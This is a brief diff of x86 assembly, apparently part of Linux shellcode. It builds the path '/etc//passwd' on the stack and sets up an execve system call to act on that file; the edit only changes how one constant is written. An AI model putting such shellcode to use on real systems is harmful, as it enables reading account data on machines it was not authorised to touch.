@@ -37,7 +37,7 @@ push 0x64777373
 push 0x61702f2f
 push 0x6374652f
 mov ecx, esp
-mov al, 0xb
+mov al, 0x0b
 push edx
 push ecx
 push ebx
